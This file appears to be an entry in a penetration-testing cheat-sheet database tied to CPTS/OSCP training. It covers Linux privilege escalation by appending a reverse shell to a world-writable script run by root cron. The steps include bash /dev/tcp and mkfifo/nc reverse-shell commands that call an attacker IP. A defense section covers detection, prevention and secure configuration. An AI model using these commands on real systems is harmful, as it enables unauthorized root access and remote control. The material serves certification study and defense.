@@ -1,0 +1,132 @@
+{
+  "type": "command",
+  "platform": "linux",
+  "requires": [
+    "local-access"
+  ],
+  "protocols": [],
+  "tools": [
+    "pspy",
+    "bash",
+    "nc"
+  ],
+  "tags": [
+    "cron",
+    "pspy",
+    "reverse-shell"
+  ],
+  "category": "Privilege Escalation",
+  "subcategory": "Linux - Cron Abuse",
+  "certifications": [
+    "CPTS",
+    "OSCP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 25: Linux Privilege Escalation",
+  "examples": [
+    {
+      "label": "Find world-writable files a cron might run",
+      "command": "find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null"
+    },
+    {
+      "label": "Watch process/cron activity as an unprivileged user",
+      "command": "./pspy64 -pf -i 1000"
+    },
+    {
+      "label": "Append a reverse shell to the writable root script",
+      "command": "echo 'bash -i >& /dev/tcp/<lhost>/443 0>&1' >> /dmz-backups/backup.sh"
+    },
+    {
+      "label": "Catch the callback on the next cron tick",
+      "command": "nc -lnvp 443"
+    },
+    {
+      "label": "Confirm cron execution timing from syslog (no pspy needed)",
+      "command": "grep \"CRON\" /var/log/syslog\n# Shows: (root) CMD (/bin/bash /home/joe/.scripts/user_backups.sh) every minute"
+    },
+    {
+      "label": "Verify cron script is world-writable before appending payload",
+      "command": "ls -lah /home/joe/.scripts/user_backups.sh\n# -rwxrwxrw- 1 root root 49 Aug 25 05:12  <- world-writable = exploitable\ncat /home/joe/.scripts/user_backups.sh"
+    },
+    {
+      "label": "Fifo reverse shell payload (more reliable than bash -i)",
+      "command": "echo >> user_backups.sh\necho \"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <lhost> 1234 >/tmp/f\" >> user_backups.sh"
+    }
+  ],
+  "notes": "pspy shows root cron jobs without needing root (reads /proc). If the job runs a script in a directory you can write, append a reverse shell and wait for the next tick. Also covered in: OSCP PEN-200 Chapter 17 (Linux Privilege Escalation).",
+  "references": [
+    {
+      "title": "pspy (DominicBreuker)",
+      "url": "https://github.com/DominicBreuker/pspy"
+    },
+    {
+      "title": "Reverse Shell Cheat Sheet",
+      "url": "http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet"
+    },
+    {
+      "title": "HTB Academy - Linux Privilege Escalation",
+      "url": "https://academy.hackthebox.com/module/details/51"
+    },
+    {
+      "title": "OffSec PEN-200 - Linux Privilege Escalation",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "linux-enum-world-writable",
+      "note": "Finds the writable script the cron runs.",
+      "rel": "prereq"
+    },
+    {
+      "id": "wildcard-abuse-tar",
+      "note": "If the cron uses tar *, use the checkpoint trick instead.",
+      "rel": "alternative"
+    },
+    {
+      "id": "reverse-shell-oneliners",
+      "note": "Payload options for the appended shell.",
+      "rel": "escalation"
+    }
+  ],
+  "id": "cron-abuse-pspy",
+  "name": "Cron Abuse - Writable Script + pspy",
+  "command": "./pspy64 -pf -i 1000",
+  "description": "Use pspy to watch for root cron jobs without root, then abuse a world-writable script they run by appending a reverse shell. Back up the original first.",
+  "steps": [
+    {
+      "label": "1. Find writable files + monitor cron",
+      "command": "find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null\nls -la /dmz-backups/\n./pspy64 -pf -i 1000"
+    },
+    {
+      "label": "2. Append reverse shell to the script",
+      "command": "cp /dmz-backups/backup.sh /tmp/backup.sh.orig\ncat /dmz-backups/backup.sh\necho 'bash -i >& /dev/tcp/10.10.14.3/443 0>&1' >> /dmz-backups/backup.sh"
+    },
+    {
+      "label": "3. Catch the shell (attacker)",
+      "command": "nc -lnvp 443"
+    }
+  ],
+  "opsec": "loud",
+  "mitre": [
+    "T1053.003"
+  ],
+  "exam": "exam-ok",
+  "defense": {
+    "why_it_works": "Cron jobs run as root on a schedule and often reference scripts or files writable by low-privileged users. pspy monitors /proc without root privileges to reveal the exact commands being executed by cron, exposing writable script paths. Modifying those scripts inserts attacker code executed as root when the cron job fires.",
+    "prerequisites": "Shell access as a low-privileged user. A cron job running as root that references a file writable by the attacker's user. pspy binary transferred to the target.",
+    "impact": "Arbitrary command execution as root at the next cron cycle (often within 1\u20135 minutes). Attacker can add SUID shells, append to /etc/sudoers, install reverse shells, or exfiltrate /etc/shadow.",
+    "detection": "File integrity monitoring (Tripwire, AIDE, inotifywait) on cron-referenced scripts. Auditd: write to /dmz-backups/backup.sh by non-root user. SIEM: unexpected shell spawned from cron parent process (crond).",
+    "artifacts": "File integrity alert (cron script modified) | Auditd write event on cron-referenced script | Bash reverse shell connection in network logs",
+    "prevention": "Ensure all files referenced by root cron jobs are owned by root and not world/group writable. Use absolute paths in cron scripts. Run cron jobs as least-privilege service accounts rather than root where possible. Audit cron jobs with: for f in /etc/cron*; do ls -la $f; done.",
+    "misconfiguration": "Root cron job references /dmz-backups/backup.sh which is owned by a low-privileged user or is world-writable. The cron job runs as root (CRONTAB has no user field or specifies root).",
+    "vulnerable_config": "# Vulnerable crontab\n*/01 * * * * cd /home/htb-student && tar -zcf /home/htb-student/backup.tar.gz *\n# Or: root cron runs /dmz-backups/backup.sh\n\n# Insecure permissions\n-rwxrwxrwx 1 root root /dmz-backups/backup.sh",
+    "secure_config": "# Secure cron script ownership and permissions\nchown root:root /dmz-backups/backup.sh\nchmod 700 /dmz-backups/backup.sh\n\n# Audit cron-referenced files\nawk '{print $6}' /etc/crontab | xargs -I{} ls -la {} 2>/dev/null\n\n# Run cron jobs as dedicated service account, not root",
+    "evasion": "pspy operates entirely through /proc -- no root required, no files written, no network traffic. Attacker appears to be running a benign background process.",
+    "sources": [
+      "HTB M25",
+      "MITRE T1053.003",
+      "MITRE T1543"
+    ]
+  }
+}
